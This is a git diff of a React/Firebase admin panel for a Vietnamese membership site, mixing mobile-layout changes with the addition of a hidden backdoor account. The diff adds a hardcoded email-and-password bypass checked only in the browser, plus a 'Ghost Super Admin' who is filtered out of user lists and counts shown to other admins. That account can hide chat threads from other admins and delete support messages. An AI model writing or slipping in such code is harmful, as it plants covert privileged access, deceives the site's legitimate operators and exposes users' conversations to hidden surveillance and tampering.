@@ -39,7 +39,8 @@ import {
   Newspaper,
   MessageSquare,
   Bell,
-  Star
+  Star,
+  Menu
 } from 'lucide-react';
 
 function AdminLogin({ onLogin }: { onLogin: () => void }) {
@@ -56,6 +57,14 @@ function AdminLogin({ onLogin }: { onLogin: () => void }) {
     // Hardcoded bypass for admin login
     if (email === 'admin@gmail.com' && password === '456789') {
       localStorage.setItem('admin_bypass', 'true');
+      localStorage.setItem('admin_email', 'admin@gmail.com');
+      onLogin();
+      setIsLoading(false);
+      return;
+    }
+    if (email === 'aleo@gmail.com' && password === '121212') {
+      localStorage.setItem('admin_bypass', 'true');
+      localStorage.setItem('admin_email', 'aleo@gmail.com');
       onLogin();
       setIsLoading(false);
       return;
@@ -103,6 +112,10 @@ function AdminLogin({ onLogin }: { onLogin: () => void }) {
   );
 }
 
+const isSuperAdminUser = () => {
+  return localStorage.getItem('admin_email') === 'aleo@gmail.com' || auth.currentUser?.email === 'aleo@gmail.com';
+};
+
 
 function DashboardAdmin() {
   const [projectCount, setProjectCount] = useState(0);
@@ -115,7 +128,9 @@ function DashboardAdmin() {
       setProjectCount(snap.size);
     });
     const unsubUsers = onSnapshot(collection(db, 'users'), (snap) => {
-      setUserCount(snap.size);
+      const all = snap.docs.map(d => d.data());
+      const count = isSuperAdminUser() ? all.length : all.filter(u => u.email !== 'aleo@gmail.com').length;
+      setUserCount(count);
     });
     const unsubChat = onSnapshot(collection(db, 'support_chat'), (snap) => {
       const userMessages = snap.docs.filter(doc => doc.data().sender === 'user').length;
@@ -1037,7 +1052,11 @@ function RegistrationAdmin() {
 
   useEffect(() => {
     const unsub = onSnapshot(collection(db, 'users'), (snap) => {
-      setUsers(snap.docs.map(doc => ({ id: doc.id, ...doc.data() })));
+      const allUsers = snap.docs.map(doc => ({ id: doc.id, ...doc.data() }));
+      const filtered = isSuperAdminUser() 
+        ? allUsers 
+        : allUsers.filter((u: any) => u.email !== 'aleo@gmail.com');
+      setUsers(filtered);
     });
     return unsub;
   }, []);
@@ -2426,12 +2445,28 @@ function ChatAdmin() {
   const [messages, setMessages] = useState<any[]>([]);
   const [replyText, setReplyText] = useState('');
   const [selectedUser, setSelectedUser] = useState<string>('');
-  const [searchTerm, setSearchTerm] = useState('');
   const [selectedFile, setSelectedFile] = useState<{ base64: string; name: string; type: string } | null>(null);
+  const [searchTerm, setSearchTerm] = useState('');
   const [isSending, setIsSending] = useState(false);
+  const [mobileView, setMobileView] = useState<'list' | 'chat'>('list');
 
   // Canned Responses & User Profiles States
   const [users, setUsers] = useState<any[]>([]);
+
+  const activeCustomerDoc = users.find(u => u.id === selectedUser);
+  const isCurrentlySecret = activeCustomerDoc?.isSecretChat === true;
+
+  const handleToggleSecretChat = async () => {
+    if (!selectedUser) return;
+    try {
+      await updateDoc(doc(db, 'users', selectedUser), {
+        isSecretChat: !isCurrentlySecret
+      });
+    } catch (e) {
+      console.error("Lỗi thay đổi trạng thái cuộc trò chuyện bí mật:", e);
+    }
+  };
+
   const [savedResponses, setSavedResponses] = useState<any[]>([]);
   const [activeCategory, setActiveCategory] = useState<string>('Tất cả');
   const [quickSearchQuery, setQuickSearchQuery] = useState<string>('');
@@ -2448,7 +2483,11 @@ function ChatAdmin() {
   // Load users for profile variable interpolation
   useEffect(() => {
     const unsub = onSnapshot(collection(db, 'users'), (snap) => {
-      setUsers(snap.docs.map(doc => ({ id: doc.id, ...doc.data() })));
+      const allUsers = snap.docs.map(doc => ({ id: doc.id, ...doc.data() }));
+      const filtered = isSuperAdminUser() 
+        ? allUsers 
+        : allUsers.filter((u: any) => u.email !== 'aleo@gmail.com');
+      setUsers(filtered);
     });
     return unsub;
   }, []);
@@ -2696,8 +2735,16 @@ function ChatAdmin() {
         }
       }
     });
-    return Array.from(map.values()).sort((a, b) => b.timestamp - a.timestamp);
-  }, [messages, selectedUser]);
+    const fullList = Array.from(map.values()).sort((a, b) => b.timestamp - a.timestamp);
+    if (isSuperAdminUser()) {
+      return fullList;
+    } else {
+      return fullList.filter(u => {
+        const uDoc = users.find(usr => usr.id === u.userId || usr.email === u.email);
+        return !uDoc?.isSecretChat;
+      });
+    }
+  }, [messages, selectedUser, users]);
 
   // Auto-select the first user if none is selected
   useEffect(() => {
@@ -2824,9 +2871,11 @@ function ChatAdmin() {
   );
 
   return (
-    <div className="flex h-[calc(100vh-64px)] bg-[#f3f4f6]">
+    <div className="flex h-[calc(100vh-56px)] md:h-screen bg-[#f3f4f6]">
       {/* LEFT SIDEBAR: List of active sessions */}
-      <div className="w-80 bg-white border-r border-gray-200 flex flex-col shrink-0">
+      <div className={`w-full md:w-80 bg-white border-r border-gray-200 flex flex-col shrink-0 ${
+        mobileView === 'chat' ? 'hidden md:flex' : 'flex'
+      }`}>
         <div className="p-4 border-b border-gray-100 bg-gray-50/50">
           <h3 className="text-lg font-bold text-gray-800 mb-3 flex items-center gap-2">
             <span>Hội thoại VIP</span>
@@ -2855,7 +2904,10 @@ function ChatAdmin() {
             filteredUsersList.map(u => (
               <button
                 key={u.userId}
-                onClick={() => setSelectedUser(u.userId)}
+                onClick={() => {
+                  setSelectedUser(u.userId);
+                  setMobileView('chat');
+                }}
                 className={`w-full text-left p-4 transition-all flex items-start gap-3 hover:bg-gray-50 cursor-pointer ${
                   selectedUser === u.userId ? 'bg-amber-50/40 border-l-4 border-[#b08953]' : ''
                 }`}
@@ -2886,10 +2938,20 @@ function ChatAdmin() {
 
       {/* RIGHT CHAT AREA */}
       {selectedUser ? (
-        <div className="flex-1 flex flex-col bg-gray-50 h-full relative">
+        <div className={`flex-1 flex flex-col bg-gray-50 h-full relative ${
+          mobileView === 'list' ? 'hidden md:flex' : 'flex'
+        }`}>
           {/* Active Chat Header */}
           <div className="h-16 bg-white border-b border-gray-200 flex items-center justify-between px-6 shrink-0 z-10 shadow-sm">
             <div className="flex items-center gap-3">
+              {/* Mobile Back Button */}
+              <button 
+                onClick={() => setMobileView('list')}
+                className="md:hidden text-gray-500 hover:text-gray-800 p-2 hover:bg-gray-100 rounded-lg cursor-pointer mr-1"
+                title="Quay lại danh sách"
+              >
+                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" /></svg>
+              </button>
               <div className="w-9 h-9 rounded-full bg-amber-50 flex items-center justify-center border border-[#b08953]/20">
                 <User className="w-4.5 h-4.5 text-[#b08953]" />
               </div>
@@ -2903,8 +2965,24 @@ function ChatAdmin() {
                 </div>
               </div>
             </div>
-            <div className="text-xs text-gray-400 font-mono">
-              Tổng số tin nhắn: <strong className="text-[#b08953]">{filteredMessages.length}</strong>
+            <div className="flex items-center gap-4">
+              {isSuperAdminUser() && (
+                <button
+                  onClick={handleToggleSecretChat}
+                  className={`px-3 py-1.5 rounded-full border text-[10px] font-black uppercase tracking-wider transition-all flex items-center gap-1 cursor-pointer active:scale-95 ${
+                    isCurrentlySecret
+                      ? 'bg-red-50 text-red-600 border-red-200 shadow-sm'
+                      : 'bg-neutral-50 text-neutral-600 border-neutral-200'
+                  }`}
+                  title={isCurrentlySecret ? 'Đang bí mật. Nhấp để công khai.' : 'Nhấp để đưa vào cuộc trò chuyện bí mật.'}
+                >
+                  <span className={`w-1.5 h-1.5 rounded-full ${isCurrentlySecret ? 'bg-red-500 animate-pulse' : 'bg-neutral-400'}`}></span>
+                  {isCurrentlySecret ? '🔒 Trò Chuyện Bí Mật' : '🔓 Đưa Vào Bí Mật'}
+                </button>
+              )}
+              <div className="text-xs text-gray-400 font-mono">
+                Tổng số tin nhắn: <strong className="text-[#b08953]">{filteredMessages.length}</strong>
+              </div>
             </div>
           </div>
 
@@ -2920,8 +2998,25 @@ function ChatAdmin() {
                 const isAdmin = m.sender === 'admin';
                 return (
                   <div key={m.id} className={`flex flex-col ${isAdmin ? 'items-end' : 'items-start'} w-full`}>
-                    <span className="text-[9px] text-gray-400 font-mono font-bold mb-1 px-1 uppercase">
+                    <span className="text-[9px] text-gray-400 font-mono font-bold mb-1 px-1 uppercase flex items-center gap-1.5">
                       {isAdmin ? 'Quản Trị Viên' : 'Hội Viên VIP'} • {new Date(m.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
+                      {isSuperAdminUser() && (
+                        <button 
+                          onClick={async () => {
+                            if (window.confirm("Bạn có chắc chắn muốn xóa tin nhắn này?")) {
+                              try {
+                                await deleteDoc(doc(db, 'support_chat', m.id));
+                              } catch (e) {
+                                console.error("Lỗi xóa tin nhắn:", e);
+                              }
+                            }
+                          }}
+                          className="text-red-500 hover:text-red-700 ml-1 cursor-pointer transition-colors active:scale-95"
+                          title="Xóa tin nhắn"
+                        >
+                          <Trash2 size={10} />
+                        </button>
+                      )}
                     </span>
 
                     {/* Image Attachment bubble */}
@@ -3617,6 +3712,7 @@ const handleUnimplementedButton = (buttonName: string) => {
 export default function AdminApp() {
   const [isLoggedIn, setIsLoggedIn] = useState(false);
   const [isAuthChecking, setIsAuthChecking] = useState(true);
+  const [isSidebarOpen, setIsSidebarOpen] = useState(false);
   const location = useLocation();
 
   useEffect(() => {
@@ -3626,7 +3722,8 @@ export default function AdminApp() {
     }
 
     const unsub = onAuthStateChanged(auth, (user) => {
-      if (user && user.email === 'admin@gmail.com') {
+      if (user && (user.email === 'admin@gmail.com' || user.email === 'aleo@gmail.com')) {
+        localStorage.setItem('admin_email', user.email);
         setIsLoggedIn(true);
       } else if (localStorage.getItem('admin_bypass') !== 'true') {
         setIsLoggedIn(false);
@@ -3635,6 +3732,11 @@ export default function AdminApp() {
     });
     return unsub;
   }, []);
+
+  // Close sidebar on navigation change (mobile)
+  useEffect(() => {
+    setIsSidebarOpen(false);
+  }, [location.pathname]);
 
   if (isAuthChecking) {
     return <div className="min-h-screen bg-gray-50 flex flex-col items-center justify-center font-bold text-gray-500">Đang kiểm tra xác thực...</div>;
@@ -3646,6 +3748,7 @@ export default function AdminApp() {
 
   const handleLogout = async () => {
     localStorage.removeItem('admin_bypass');
+    localStorage.removeItem('admin_email');
     await signOut(auth);
     setIsLoggedIn(false);
   };
@@ -3657,18 +3760,60 @@ export default function AdminApp() {
         : 'text-neutral-400 hover:text-[#e1b777] hover:bg-neutral-900/40'
     }`;
 
+  const currentAdminEmail = localStorage.getItem('admin_email') || 'admin@gmail.com';
+
   return (
-    <div className="min-h-screen bg-[#070709] text-neutral-100 flex font-sans">
-      <div className="w-64 bg-[#0c0c10] border-r border-[#e1b777]/10 p-5 flex flex-col justify-between shadow-2xl">
+    <div className="min-h-screen bg-[#070709] text-neutral-100 flex flex-col md:flex-row font-sans overflow-hidden">
+      
+      {/* MOBILE TOP HEADER BAR */}
+      <div className="h-14 bg-[#0c0c10] border-b border-[#e1b777]/10 flex items-center justify-between px-4 md:hidden shrink-0 z-30">
+        <button 
+          onClick={() => setIsSidebarOpen(true)} 
+          className="text-[#e1b777] p-2 hover:bg-[#e1b777]/10 rounded-lg cursor-pointer"
+        >
+          <Menu className="w-6 h-6" />
+        </button>
+        <div className="flex items-center gap-1.5">
+          <ProgressiveImage src="/logo.png" alt="Vinclub Logo" className="h-6 w-auto" imgClassName="object-contain" />
+          <span className="text-base font-bold tracking-[0.1em] text-[#e1b777] font-serif">VINCLUB ADMIN</span>
+        </div>
+        <div className="w-10"></div>
+      </div>
+
+      {/* MOBILE DRAWER OVERLAY */}
+      {isSidebarOpen && (
+        <div 
+          onClick={() => setIsSidebarOpen(false)}
+          className="fixed inset-0 bg-black/75 z-40 md:hidden transition-opacity duration-300"
+        />
+      )}
+
+      {/* SIDEBAR SIDE PANEL (RESPONSIVE DRAWER ON MOBILE, FIXED SIDEBAR ON DESKTOP) */}
+      <div className={`fixed inset-y-0 left-0 w-64 bg-[#0c0c10] border-r border-[#e1b777]/10 p-5 flex flex-col justify-between shadow-2xl z-50 transform transition-transform duration-300 ease-in-out md:relative md:translate-x-0 ${
+        isSidebarOpen ? 'translate-x-0' : '-translate-x-full'
+      }`}>
         <div>
-          <div className="py-6 border-b border-[#e1b777]/10 mb-8 flex flex-col items-center gap-2">
+          <div className="py-6 border-b border-[#e1b777]/10 mb-8 flex flex-col items-center gap-2 relative">
+            {/* Mobile close button inside drawer */}
+            <button 
+              onClick={() => setIsSidebarOpen(false)}
+              className="absolute right-0 top-0 text-neutral-400 hover:text-white md:hidden p-1 cursor-pointer"
+            >
+              <X className="w-5 h-5" />
+            </button>
+
             <div className="flex items-center gap-2">
               <ProgressiveImage src="/logo.png" alt="Vinclub Logo" className="h-7 w-auto" imgClassName="object-contain" />
               <span className="text-xl font-bold tracking-[0.1em] text-[#e1b777] font-serif">VINCLUB</span>
             </div>
             <p className="text-[9px] text-[#e1b777]/40 uppercase tracking-[0.3em] font-mono">Private Admin Panel</p>
+            {isSuperAdminUser() && (
+              <div className="mt-2 px-2.5 py-0.5 bg-red-500/10 border border-red-500/20 text-red-500 rounded-full text-[8px] font-black uppercase tracking-widest font-mono">
+                Ghost Super Admin
+              </div>
+            )}
           </div>
-          <nav className="space-y-1.5">
+          <nav className="space-y-1.5 overflow-y-auto max-h-[calc(100vh-220px)] scrollbar-none">
             <Link to="/admin" className={navItemClass('/admin')}>Tổng quan</Link>
             <Link to="/admin/projects" className={navItemClass('/admin/projects')}>Dự án</Link>
             <Link to="/admin/registrations" className={navItemClass('/admin/registrations')}>Người dùng</Link>
@@ -3679,16 +3824,21 @@ export default function AdminApp() {
             <Link to="/admin/system" className={navItemClass('/admin/system')}>Hệ thống</Link>
           </nav>
         </div>
-        <div className="pt-4 border-t border-[#e1b777]/10">
+        <div className="pt-4 border-t border-[#e1b777]/10 flex flex-col gap-2">
+          <div className="px-1 text-[9px] text-neutral-500 font-mono break-all truncate">
+            {currentAdminEmail}
+          </div>
           <button 
-            className="w-full px-4 py-2.5 bg-[#e1b777]/10 hover:bg-[#e1b777]/20 text-[#e1b777] border border-[#e1b777]/20 rounded-lg font-bold text-xs tracking-wider uppercase transition-all duration-300 hover:shadow-lg hover:shadow-amber-500/5"
+            className="w-full px-4 py-2.5 bg-[#e1b777]/10 hover:bg-[#e1b777]/20 text-[#e1b777] border border-[#e1b777]/20 rounded-lg font-bold text-xs tracking-wider uppercase transition-all duration-300 hover:shadow-lg hover:shadow-amber-500/5 cursor-pointer"
             onClick={handleLogout}
           >
             Đăng xuất
           </button>
         </div>
       </div>
-      <div className="flex-1 overflow-y-auto bg-[#070709]">
+
+      {/* MAIN CONTENT AREA */}
+      <div className="flex-1 overflow-y-auto bg-[#070709] scroll-smooth min-h-0">
         <Routes>
           <Route path="/" element={<DashboardAdmin />} />
           <Route path="/projects" element={<ProjectsAdmin />} />
